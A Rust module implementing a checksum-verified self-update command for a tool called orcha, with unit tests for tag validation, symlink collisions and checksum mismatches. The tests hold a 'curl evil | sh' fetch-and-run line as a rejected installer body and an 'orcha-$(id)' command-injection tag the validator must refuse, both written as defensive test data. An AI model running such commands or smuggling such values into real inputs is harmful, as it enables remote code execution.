//! `orcha update`: runs the installer of the newest release, pinned to that
//! release's tag and checked against the release's SHA256SUMS.txt before it
//! runs. The installer then checks the app it downloads the same way.

use std::io::Write;
use std::path::{Path, PathBuf};

const LATEST_API: &str = "https://api.github.com/repos/trungkien1208/orcha/releases/latest";
const DOWNLOADS: &str = "https://github.com/trungkien1208/orcha/releases/download";
const CHECKSUMS: &str = "SHA256SUMS.txt";
/// Tells install.sh / install.ps1 which release to install.
const TAG_ENV: &str = "ORCHA_INSTALL_TAG";

/// Installs the newest release and returns its tag. `quiet` keeps the
/// installer's output off the screen (the app runs it behind its own UI).
/// Blocking.
pub(crate) fn install_latest(quiet: bool) -> Result<String, String> {
    let tag = latest_tag()?;
    let base = format!("{DOWNLOADS}/{tag}");
    let sums = download(&format!("{base}/{CHECKSUMS}"))
        .map_err(|err| format!("could not read the checksums of {tag} ({err})"))?;
    let name = crate::platform::orcha_installer_script();
    let script = download(&format!("{base}/{name}"))
        .map_err(|err| format!("could not download the installer of {tag} ({err})"))?;
    let path = verified_installer(
        &script,
        &String::from_utf8_lossy(&sums),
        name,
        &std::env::temp_dir(),
    )?;
    let mut command = crate::platform::orcha_installer_command(&path);
    command.env(TAG_ENV, &tag);
    if quiet {
        crate::platform::configure_background_command(&mut command);
        command
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null());
    }
    let status = command.status();
    let _ = std::fs::remove_file(&path);
    match status {
        Ok(status) if status.success() => Ok(tag),
        Ok(status) => Err(format!("the installer stopped ({status})")),
        Err(err) => Err(format!("could not run the installer ({err})")),
    }
}

/// The newest release's tag, as GitHub names it.
fn latest_tag() -> Result<String, String> {
    let reply = download(LATEST_API)
        .map_err(|err| format!("could not ask GitHub for the newest release ({err})"))?;
    let tag = serde_json::from_slice::<serde_json::Value>(&reply)
        .ok()
        .and_then(|release| release["tag_name"].as_str().map(str::to_owned))
        .ok_or("GitHub did not name the newest release")?;
    if !valid_tag(&tag) {
        return Err(format!("the newest release has an odd tag: {tag}"));
    }
    Ok(tag)
}

/// `orcha-1.2.3`: it goes into URLs and the installer's environment.
fn valid_tag(tag: &str) -> bool {
    tag.strip_prefix("orcha-").is_some_and(|rest| {
        !rest.is_empty()
            && rest
                .chars()
                .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '.' | '_' | '-'))
    })
}

fn download(url: &str) -> Result<Vec<u8>, String> {
    let output = crate::noninteractive_process::curl_command()
        .args(["-fsSL", "--connect-timeout", "10", "--max-time", "120", url])
        .stdin(std::process::Stdio::null())
        .output()
        .map_err(|err| format!("curl: {err}"))?;
    if !output.status.success() {
        let said = String::from_utf8_lossy(&output.stderr);
        return Err(said.trim().chars().take(120).collect());
    }
    Ok(output.stdout)
}

/// The SHA-256 a `sha256sum` listing gives for `name`.
fn checksum_for<'a>(sums: &'a str, name: &str) -> Option<&'a str> {
    sums.lines().find_map(|line| {
        let mut fields = line.split_whitespace();
        let hash = fields.next()?;
        let file = fields.next()?;
        (file.trim_start_matches('*') == name).then_some(hash)
    })
}

/// Saves `script` as a private file in `dir` and checks it against its
/// line in `sums`. Anything that does not match is deleted, never run.
fn verified_installer(
    script: &[u8],
    sums: &str,
    name: &str,
    dir: &Path,
) -> Result<PathBuf, String> {
    let expected = checksum_for(sums, name)
        .ok_or_else(|| format!("the release lists no checksum for {name}, so it was not run"))?;
    let stamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_or(0, |since| since.as_nanos());
    // keeps the extension: PowerShell runs only .ps1 files
    let path = dir.join(format!("orcha-{}-{stamp}-{name}", std::process::id()));
    save_verified_installer(script, expected, name, &path)?;
    Ok(path)
}

fn save_verified_installer(
    script: &[u8],
    expected: &str,
    name: &str,
    path: &Path,
) -> Result<(), String> {
    // Only clean up a file we created. A collision (including a symlink)
    // belongs to someone else and must survive a failed exclusive open.
    let mut file = crate::platform::create_private_state_file(path)
        .map_err(|err| format!("could not save the installer ({err})"))?;
    let saved = file.write_all(script).and_then(|()| file.sync_all());
    drop(file);
    if let Err(err) = saved {
        let _ = std::fs::remove_file(path);
        return Err(format!("could not save the installer ({err})"));
    }
    if let Err(err) = crate::checksum::verify_sha256(path, expected) {
        let _ = std::fs::remove_file(path);
        return Err(format!(
            "{name} did not match the release's checksum, so it was not run ({err})"
        ));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A well-formed checksum of something else.
    const OTHER_SHA: &str = "4d5bd0a5b5e3b7a9c8a8a57f42b6ab0a8b1a5c2a2d2e7d8a0b0e5b3f3e1d2c1b";

    fn temp_dir(name: &str) -> PathBuf {
        let dir =
            std::env::temp_dir().join(format!("orcha-installer-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("test folder");
        dir
    }

    fn real_sha(bytes: &[u8]) -> String {
        use sha2::Digest;
        sha2::Sha256::digest(bytes)
            .iter()
            .map(|byte| format!("{byte:02x}"))
            .collect()
    }

    #[test]
    fn checksums_are_found_by_file_name() {
        let sums = "aaa  orcha-macos-arm64\nbbb *install.sh\n\nccc  install.ps1\n";
        assert_eq!(checksum_for(sums, "install.sh"), Some("bbb"));
        assert_eq!(checksum_for(sums, "install.ps1"), Some("ccc"));
        assert_eq!(checksum_for(sums, "install"), None);
    }

    #[test]
    fn a_matching_installer_is_kept_and_private() {
        let dir = temp_dir("match");
        let sums = format!("{}  install.sh\n", real_sha(b"echo hi\n"));
        let path = verified_installer(b"echo hi\n", &sums, "install.sh", &dir).expect("verified");
        assert_eq!(std::fs::read(&path).unwrap(), b"echo hi\n");
        assert!(path.to_string_lossy().ends_with("install.sh"));
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = std::fs::metadata(&path).unwrap().permissions().mode();
            assert_eq!(mode & 0o777, 0o600);
        }
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_preexisting_installer_path_is_neither_removed_nor_changed() {
        let dir = temp_dir("collision");
        let path = dir.join("install.sh");
        std::fs::write(&path, "existing").unwrap();
        assert!(save_verified_installer(b"new", &real_sha(b"new"), "install.sh", &path).is_err());
        assert_eq!(std::fs::read_to_string(&path).unwrap(), "existing");
        #[cfg(unix)]
        {
            std::fs::remove_file(&path).unwrap();
            let target = dir.join("target");
            std::fs::write(&target, "target").unwrap();
            std::os::unix::fs::symlink(&target, &path).unwrap();
            assert!(
                save_verified_installer(b"new", &real_sha(b"new"), "install.sh", &path).is_err()
            );
            assert!(path.symlink_metadata().unwrap().file_type().is_symlink());
            assert_eq!(std::fs::read_to_string(target).unwrap(), "target");
        }
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn a_checksum_mismatch_is_refused_and_nothing_is_left_to_run() {
        let dir = temp_dir("mismatch");
        let sums = format!("{OTHER_SHA}  install.sh\n");
        let refused = verified_installer(b"curl evil | sh\n", &sums, "install.sh", &dir);
        assert!(refused.is_err_and(|err| err.contains("did not match")));
        assert_eq!(std::fs::read_dir(&dir).unwrap().count(), 0);
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_release_without_an_installer_checksum_is_refused() {
        let dir = temp_dir("unlisted");
        let sums = format!("{}  orcha-macos-arm64\n", real_sha(b"x"));
        assert!(verified_installer(b"x", &sums, "install.sh", &dir)
            .is_err_and(|err| err.contains("no checksum")));
        assert_eq!(std::fs::read_dir(&dir).unwrap().count(), 0);
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn only_plain_release_tags_are_used() {
        assert!(valid_tag("orcha-1.0.0"));
        assert!(valid_tag("orcha-1.0.0-beta.1"));
        for odd in [
            "orcha-",
            "1.0.0",
            "orcha-1.0 0",
            "orcha-1/../x",
            "orcha-$(id)",
        ] {
            assert!(!valid_tag(odd), "{odd}");
        }
    }
}
